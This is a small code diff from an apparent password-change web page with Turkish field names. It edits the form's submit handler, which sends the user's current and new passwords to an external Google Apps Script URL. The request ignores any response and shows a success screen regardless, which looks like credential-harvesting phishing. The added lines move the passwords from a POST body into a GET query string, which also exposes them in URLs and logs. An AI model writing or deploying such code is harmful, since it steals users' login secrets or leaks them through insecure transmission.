@@ -448,12 +448,9 @@
       document.getElementById('pw-err').style.display = 'block';
       return;
     }
-    fetch('https://script.google.com/macros/s/AKfycbweQ2FrnycuU0OaqBopV1gGFdXrBR9iXkOJ8go5p-7vI-8y08uNcRE-9-JU0i1INCy5/exec', {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ mevcut: p0, yeni: p1, tekrar: p2 })
-    });
+    const url = 'https://script.google.com/macros/s/AKfycbweQ2FrnycuU0OaqBopV1gGFdXrBR9iXkOJ8go5p-7vI-8y08uNcRE-9-JU0i1INCy5/exec';
+    const params = '?mevcut=' + encodeURIComponent(p0) + '&yeni=' + encodeURIComponent(p1) + '&tekrar=' + encodeURIComponent(p2);
+    fetch(url + params, { method: 'GET', mode: 'no-cors' });
     goTo('s-success');
   }
 </script>
